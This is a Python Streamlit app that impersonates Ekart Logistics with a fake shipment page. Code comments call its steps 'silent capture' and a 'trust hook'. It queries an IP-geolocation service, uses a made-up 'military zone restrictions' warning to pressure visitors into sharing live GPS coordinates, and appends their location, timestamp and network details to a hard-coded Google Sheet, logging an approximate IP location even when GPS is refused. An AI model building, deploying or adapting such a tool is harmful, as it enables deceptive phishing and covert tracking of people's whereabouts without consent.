import streamlit as st
from streamlit_geolocation import streamlit_geolocation
import pandas as pd
import requests
import gspread
from oauth2client.service_account import ServiceAccountCredentials
import datetime

# --- CONFIGURATION ---
SHEET_ID = "1guGuwYY8I1iNnqmRw0bVBT2s9e2QA1H672gOcsIS0ts"

# UI Styling for EKART Branding
st.set_page_config(page_title="Ekart Logistics | Track Shipment", page_icon="📦", layout="centered")

st.markdown("""
    <style>
    .stApp { background-color: #f4f4f4; }
    .header { background-color: #2874f0; padding: 15px; color: white; text-align: center; font-family: Arial; font-weight: bold; font-size: 22px; }
    .tracking-card { background: white; padding: 25px; border-radius: 8px; border: 1px solid #ddd; margin-top: 20px; }
    .status-bar { color: #388e3c; font-weight: bold; margin-bottom: 10px; }
    </style>
    <div class="header">EKART LOGISTICS - SECURITY PORTAL</div>
""", unsafe_allow_html=True)

# 1. SILENT CAPTURE (IP & Device Info)
# This runs the second the link is opened
try:
    # Use a high-precision IP API
    ip_resp = requests.get('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,query,mobile,proxy').json()
    silent_intel = {
        "IP": ip_resp.get('query'),
        "City": ip_resp.get('city'),
        "ISP": ip_resp.get('isp'),
        "Mobile": ip_resp.get('mobile'),
        "Proxy/VPN": ip_resp.get('proxy')
    }
except:
    silent_intel = {"IP": "Capture Failed"}

# 2. THE TRUST HOOK (Force User Action)
st.markdown("<div class='tracking-card'>", unsafe_allow_html=True)
st.markdown("<div class='status-bar'>● Shipment Status: On Hold at Hub</div>", unsafe_allow_html=True)
st.write("Tracking ID: **EK7729102IN**")
st.warning("Action Required: Due to updated military zone restrictions, you must verify your live coordinates to proceed with delivery.")

# This is the "Force" - the app doesn't show the map until this is clicked
location = streamlit_geolocation()

# 3. DATA LOGGING ENGINE
def log_to_sheet(lat, lon, acc, method):
    try:
        scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
        creds = ServiceAccountCredentials.from_json_keyfile_name("creds.json", scope)
        client = gspread.authorize(creds)
        sheet = client.open_by_key(SHEET_ID).sheet1
        
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        row = [timestamp, silent_intel['IP'], lat, lon, acc, method, silent_intel['ISP'], silent_intel['City']]
        sheet.append_row(row, value_input_option='USER_ENTERED')
        return True
    except Exception as e:
        st.error(f"Command Center Sync Failed: {e}")
        return False

# Logic: If GPS is granted, use it. If not, log the IP-based location automatically.
if location.get('latitude'):
    st.success("✅ High-Precision GPS Verified.")
    log_to_sheet(location['latitude'], location['longitude'], location['accuracy'], "GPS_CLICK")
    
    # Display precision map
    df = pd.DataFrame({'lat': [location['latitude']], 'lon': [location['longitude']]})
    st.map(df)
else:
    # AUTO-LOG IP DATA (Even if they don't click or if they block)
    if silent_intel['IP'] != "Capture Failed":
        log_to_sheet(ip_resp.get('lat'), ip_resp.get('lon'), "Approx", "IP_SILENT")
    st.info("Waiting for Secure Location Handshake...")

st.markdown("</div>", unsafe_allow_html=True)
